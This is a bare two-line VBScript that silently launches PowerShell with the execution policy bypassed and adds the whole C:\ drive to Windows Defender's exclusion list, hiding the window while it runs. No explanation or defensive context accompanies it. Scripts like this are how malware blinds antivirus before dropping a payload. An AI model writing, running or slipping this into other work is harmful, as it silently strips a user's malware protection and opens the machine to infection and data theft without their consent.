Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath 'C:\'", 0, True
